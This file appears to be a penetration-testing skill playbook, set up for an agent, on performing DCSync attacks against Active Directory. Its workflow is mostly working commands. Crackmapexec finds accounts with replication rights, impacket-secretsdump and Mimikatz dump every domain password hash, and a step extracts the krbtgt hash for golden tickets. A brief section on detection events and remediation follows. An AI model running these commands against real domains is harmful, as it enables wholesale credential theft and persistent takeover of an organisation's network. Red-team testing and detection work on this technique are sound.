<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-dcsync-attack
description: >-
  Execute and detect DCSync attacks using Impacket secretsdump and Mimikatz to
  replicate domain credentials via the MS-DRSR protocol. Identify principals
  with Replicating Directory Changes permissions and audit DCSync exposure.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - dcsync
  - secretsdump
  - credential-dumping
  - replication
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1003.006"]
  frameworks: ["MITRE ATT&CK"]
  tools: ["impacket", "mimikatz", "crackmapexec"]
---

# Performing DCSync Attack

## Overview

DCSync abuses the Directory Replication Service Remote Protocol (MS-DRSR) to
request password data from a domain controller, as if the attacker were a
replication partner DC. Requires Replicating Directory Changes and Replicating
Directory Changes All extended rights on the domain object.

## Prerequisites

- Tools: `impacket` (secretsdump), `mimikatz`, `crackmapexec`
- Account with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
- Network access to DC (RPC 135, dynamic ports)

## Workflow

### Step 1: Identify DCSync-Capable Principals

```bash
# Enumerate replication rights with crackmapexec
crackmapexec ldap 10.0.0.1 -u jsmith -p 'P@ssw0rd' -d corp.local \
  -M daclread -o TARGET_DN="DC=corp,DC=local" ACTION=read RIGHTS=DCSync

# PowerShell — find principals with replication rights
# Get-ADPermission -Identity "DC=corp,DC=local" |
#   Where-Object {$_.ExtendedRights -like "*Replicating*"}

# Agent enumeration
python3 scripts/agent.py enumerate --domain corp.local --dc-ip 10.0.0.1
```

### Step 2: Execute DCSync

```bash
# Dump all domain hashes via secretsdump
impacket-secretsdump -just-dc corp.local/admin:'P@ssw0rd'@10.0.0.1

# Dump specific user (krbtgt for golden ticket)
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:'P@ssw0rd'@10.0.0.1

# Dump NTDS with history
impacket-secretsdump -just-dc -history corp.local/admin:'P@ssw0rd'@10.0.0.1 \
  -outputfile ntds_dump

# Mimikatz DCSync
# lsadump::dcsync /domain:corp.local /user:krbtgt
# lsadump::dcsync /domain:corp.local /all /csv
```

### Step 3: Extract High-Value Targets

```bash
# Extract krbtgt hash for golden ticket
grep krbtgt ntds_dump.ntds | cut -d: -f4

# Find accounts with admin-count=1
impacket-secretsdump -just-dc-user Administrator \
  corp.local/admin:'P@ssw0rd'@10.0.0.1

# Analyze dump results
python3 scripts/agent.py analyze --domain corp.local --ntds-file ntds_dump.ntds
```

## Verification

- [ ] Principals with replication rights enumerated
- [ ] Non-DC accounts with DCSync capability identified
- [ ] Domain hashes extracted (authorized testing only)
- [ ] krbtgt hash recovered for golden ticket assessment
- [ ] Remediation: remove unnecessary replication rights

## Detection Opportunities

- Event 4662 with DS-Replication-Get-Changes GUID {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
- Event 4662 with DS-Replication-Get-Changes-All GUID {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
- DRS replication traffic from non-DC source IPs
- Sigma rule: `win_security_dcsync_activity`

## References

- [Impacket secretsdump](https://github.com/fortra/impacket/blob/main/examples/secretsdump.py)
- [ADSecurity — DCSync](https://adsecurity.org/?p=1729)
- [Mimikatz DCSync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
